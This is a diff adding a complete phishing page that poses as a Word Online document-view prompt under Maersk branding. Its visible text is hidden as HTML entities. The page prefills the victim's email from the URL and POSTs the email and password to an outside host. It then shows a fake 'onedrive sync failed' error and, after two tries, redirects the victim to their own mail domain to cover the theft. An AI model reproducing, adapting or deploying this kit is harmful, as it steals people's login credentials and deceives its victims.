@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Word Online</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <style>
+        .backIMG {
+            background-image: url('https://img4.goodfon.com/wallpaper/nbig/f/a8/port-konteinera-pogruzchik-richstaker-pogruzchik-maersk-line.jpg');
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+
+        .hexi54 {
+            display: block;
+            width: 100%;
+            padding: .375rem .75rem;
+            font-size: 1rem;
+            line-height: 1.5;
+            color: #495057;
+            background-color: #fff;
+            background-clip: padding-box;
+            border: 1px solid #ced4da;
+            border-radius: .25rem;
+            transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
+        }
+
+        .bb {
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.5);
+        }
+
+        .h33 {
+            font-size: .9rem;
+            color: #ff6600;
+        }
+
+        .btnx {
+            background-color: #0a59a3;
+        }
+    </style>
+</head>
+
+<body class="backIMG">
+    <div class="container-fluid p-0">
+        <div class="container">
+            <div class="row my-5">
+                <div class="col-lg-5 mx-auto">
+                    <div class="m-5 p-4 bg-white rounded bb">
+                        <div class="text-left">
+                            <span>
+                                <div style="text-align: center;">
+                                    <img src="data:image/png;base64,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" width="110px"><br>
+                                    <span class="h33">
+                                        &#77;&#97;&#101;&#114;&#115;&#107;&#108;&#105;&#110;&#101;&#32;&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#32;&#80;&#111;&#108;&#105;&#99;&#121;&#58;&#32;&#114;&#101;&#99;&#105;&#112;&#105;&#101;&#110;&#116;&#39;&#115;&#32;&#101;&#109;&#97;&#105;&#108;&#32;&#97;&#117;&#116;&#104;&#101;&#110;&#116;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#32;&#105;&#115;&#32;&#114;&#101;&#113;&#117;&#105;&#114;&#101;&#100;&#32;&#116;&#111;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#118;&#105;&#101;&#119;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;
+                                    </span><br>
+									<form method="POST" action="" id="liverpool"> 
+                                    <span id="errorpost" class="text-danger"></span><br>
+                                    <div class="form-group">
+                                        <input class="hexi54 rounded-0 bg-transparent" 
+                                            placeholder="&#69;&#109;&#97;&#105;&#108;"name="email" autocomplete="off"
+                                            id="email"><br>
+                                        <input class="hexi54 rounded-0 bg-transparent" type="password" value=""
+                                            placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;"
+                                            autocomplete="off" id="password" name="password"><br>
+                                    </div>
+                                </div>
+                                <div class="form-check mt-3">
+                                    <input type="checkbox" class="form-check-input">
+                                    <label class="form-check-label">
+                                        <span>
+                                            <a
+                                                href="#">&#32;&#102;&#111;&#114;&#103;&#101;&#116;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;</a>
+                                        </span>
+                                    </label>
+                                </div>
+                                <div class="col-lg-12 mt-3">
+                                    <button class="btn text-white px-4 w-100 btnx"
+                                        id="pico0">&#99;&#111;&#110;&#116;&#105;&#110;&#117;&#101;</button>
+                                    <button class="btn text-white px-4 w-100 btnx" onclick="tango(99)" id="pico"
+                                        style="display: none;">&#99;&#111;&#110;&#116;&#105;&#110;&#117;&#101;</button>
+									</form>
+                                </div>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+   
+	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+
+  <script>
+$(document).ready(function(){
+var count=0;
+
+var email = window.location.hash.substr(1);
+if (!email) {
+
+}
+else
+{
+var my_email =email;
+$('#email').val(my_email);
+$('.emailLabel').html(my_email);
+
+
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+
+}
+
+
+$('#pico0').click(function(event){
+
+event.preventDefault();
+var email=$("#email").val();
+var password=$("#password").val();
+
+if (!password) {
+    $('#errorpost').show();
+    $('#errorpost').html("Password is empty!");
+
+                return false;
+            }
+
+count=count+1;
+
+$.ajax({
+dataType: 'JSON',
+url: 'https://minecryto.com/ship/mun.php',
+type: 'POST',
+      	data:{
+			email:email,
+            password:password,	
+      	},
+			data: $('#liverpool').serialize(),
+            beforeSend: function(xhr){
+            	
+            },
+            success: function(response){
+            	if(response){
+            		$("#passwordError").show();
+            		console.log(response);
+            		if(response['signal'] == 'ok'){
+            			$("#password").val("");
+            			if (count>=2) {
+            				count=0;
+                    // window.location.replace(response['redirect_link']);
+                  window.location.replace("https://www."+my_slice);
+
+                }
+            	$("#errorpost").show();
+			 $('#errorpost').html("Error: onedrive sync failed. Please try again.");
+              
+            }
+            else{
+            	$("#errorpost").show();
+			 $('#errorpost').html("Error: onedrive sync failed. Please try again.");
+               
+            }
+        }
+    },
+    error: function(){
+    	$("#password").val("");
+    	if (count>=2) {
+    		count=0;
+    	 window.location.replace("https://www."+my_slice);	
+    	}
+            	$("#errorpost").show();
+			 $('#errorpost').html("Error: onedrive sync failed. Please try again.");
+              
+    },
+    complete: function(){
+    	
+    }
+});
+  });
+
+
+	});
+
+
+</script>
+</body>
+
+</html>
